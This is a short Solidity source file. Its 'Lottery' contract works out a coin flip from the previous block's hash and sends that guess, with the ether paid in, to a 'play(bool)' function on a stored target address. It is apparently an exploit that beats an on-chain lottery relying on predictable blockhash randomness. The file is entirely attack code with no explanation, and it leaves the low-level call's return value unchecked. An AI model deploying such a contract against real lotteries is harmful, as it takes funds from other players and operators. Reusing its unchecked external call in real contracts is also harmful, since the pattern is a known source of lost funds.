pragma solidity ^0.4.21;





contract caller {
    
    address _addr;
    event _somethingWrong (string _str2);
    
    function _set (address addr) public{
        _addr = addr;
    }
    
    function _callLottery (bool _theAns) public { 
        _addr.call.value(msg.value)(bytes4(sha3("play(bool)")),_theAns);
    }
    
    
    
}

contract Lottery is caller {
    
    event weDidIt(string _str, uint _amount);
    
    function () payable public {
        
    }
    
    function gogo() public payable  {
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        if (coinFlip == 1) {
            _callLottery(true);
            emit weDidIt("heads_winner", msg.value);
        }
        else{
            _callLottery(false);
            emit weDidIt("tails_winner", msg.value);
        }
    }
    
}
